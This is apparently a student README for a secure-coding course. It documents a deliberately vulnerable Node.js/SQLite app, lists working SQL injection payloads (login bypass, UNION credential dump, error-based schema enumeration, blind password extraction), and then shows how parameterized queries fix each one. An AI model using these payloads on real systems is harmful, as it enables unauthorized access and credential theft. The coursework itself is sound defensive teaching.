# WEB404 Secure Coding Practices — Assignment 4

**Student:** Tenzin Namgay (Cuney)
**Student ID:** 02230307

## Topic

**SQL Injection**

A deliberately vulnerable Node.js web app used to demonstrate four types of
SQL injection attack, all driven from the browser UI.

> ⚠️ This app is intentionally insecure for coursework. Do not deploy it or
> expose it to a network. Run it only on `localhost`.

## Stack

- Node.js + Express
- EJS views
- SQLite (`sqlite3` package)

## Setup and run

```bash
npm install     # install dependencies
npm run seed    # create app.db and load fake users + products
npm start       # start the app on http://localhost:3000
```

Then open **http://localhost:3000** in a browser. Every vulnerable feature is
linked from the home page. Each submitted SQL query is also printed to the
terminal so you can see exactly what gets built.

To reset the data at any time, run `npm run seed` again.

## Seed data

**users** (id, username, password, role)

| username | password        | role  |
|----------|-----------------|-------|
| admin    | SuperSecret123  | admin |
| tenzin   | password1       | user  |
| karma    | letmein         | user  |
| sonam    | qwerty          | user  |

**products** (id, name, price, category) — categories: `electronics`,
`furniture`, `stationery`.

## The four vulnerable features

| # | Feature          | Route                      | Attack type           |
|---|------------------|----------------------------|-----------------------|
| 1 | Login            | `POST /login`              | Authentication bypass |
| 2 | Product search   | `GET /products?category=`  | UNION based           |
| 3 | Product lookup   | `GET /product?id=`         | Error based           |
| 4 | Check username   | `GET /check?username=`     | Boolean based blind   |

All four build their SQL with string concatenation on purpose. Each vulnerable
line is marked with a `VULNERABLE:` comment in [app.js](app.js).

## Attack payloads to try

### 1. Authentication bypass — Login form

On the Login page, enter:

- **Username:** `admin' --`
- **Password:** (anything, e.g. `x`)

The `--` comments out the password check, so you log in as **admin** without
knowing the password. Another classic:

- **Username:** `' OR '1'='1' --`  → logs in as the first user in the table.

### 2. UNION based — Product search by category

In the category box, paste:

```
electronics' UNION SELECT id, username, password, role FROM users --
```

The products table and the users table both have 4 columns, so the UNION
succeeds and dumps every username/password into the results table.

To confirm the column count first, you can try:

```
electronics' ORDER BY 4 --
```

(4 works, `ORDER BY 5` errors.)

### 3. Error based — Product lookup by id

In the id box, enter a value that breaks the SQL so the raw database error is
printed on the page:

```
1 AND 1=(SELECT COUNT(*) FROM nope)
```

→ error reveals `no such table: nope`. Or simply:

```
1'
```

→ error reveals an `SQLITE_ERROR: ... syntax error` message, confirming your
input reaches the query unescaped. You can also enumerate the schema:

```
0 UNION SELECT 1, name, sql, 'x' FROM sqlite_master
```

### 4. Boolean based blind — Check username

The page only ever says "exists" or "does not exist". Ask true/false questions
and watch which answer comes back.

Baseline — always true, so it says **exists**:

```
admin' AND '1'='1
```

Always false, so it says **does not exist**:

```
admin' AND '1'='2
```

Now extract data one character at a time. This asks "does the admin password
start with `S`?" — if it says **exists**, the guess is right:

```
admin' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='S
```

Change the `1` (position) and `'S'` (guessed character) to read the password
letter by letter.

## Fixes (Stage 2)

Every vulnerable query was rewritten to use **parameterized queries** — `?`
placeholders with the values passed as a separate array to the `sqlite3`
methods (`db.all(sql, [params], cb)` / `db.get(sql, [params], cb)`). SQLite
then treats the values strictly as data, never as SQL, so injected quotes,
`UNION`, comments, and boolean conditions are matched as literal text instead
of being executed. The routes, forms, and URLs are unchanged, so every Stage 1
step can be re-tested the same way.

| # | Vulnerability | Route | Fix |
|---|---------------|-------|-----|
| 1 | Authentication bypass | `POST /login` | Query uses `WHERE username = ? AND password = ?` with `[username, password]` bound as parameters. `admin' --` is now matched as a literal username and finds no user. |
| 2 | UNION based | `GET /products?category=` | Query uses `WHERE category = ?` with `[category]` bound. An injected `' UNION SELECT ... --` is searched for as a literal category name and matches nothing. |
| 3 | Error based | `GET /product?id=` | Query uses `WHERE id = ?` with `[id]` bound, so malformed input cannot break the SQL. In addition, database errors are now logged server-side only and the page shows a generic **"Product not found"** message — the raw error is never returned to the browser. |
| 4 | Boolean based blind | `GET /check?username=` | Query uses `WHERE username = ?` with `[username]` bound. Payloads like `admin' AND '1'='1` are matched as a literal username (none exists), so the true/false responses no longer differ and nothing can be inferred. |

Each fixed line in [app.js](app.js) has a `FIXED:` comment explaining why it is
now safe.

### Re-test results (same payloads as Stage 1)

| Attack | Payload | Before | After |
|--------|---------|--------|-------|
| Auth bypass | `admin' --` / `' OR '1'='1' --` | logged in as admin | **Invalid username or password** |
| UNION | `electronics' UNION SELECT id,username,password,role FROM users --` | dumped all credentials | **No products found** |
| Error based | `1'` | printed raw `SQLITE_ERROR` | **Product not found** (no raw error) |
| Boolean blind | `admin' AND '1'='1` vs `...'1'='2` | differed (exists / does not exist) | **both "does not exist"** |

Legitimate use still works: `admin` / `SuperSecret123` logs in, category
`electronics` lists products, `id=1` returns a product, and checking `admin`
returns "exists".

## Status

Stage 2 complete: all four vulnerabilities fixed with parameterized queries and
verified by re-running the Stage 1 attacks.
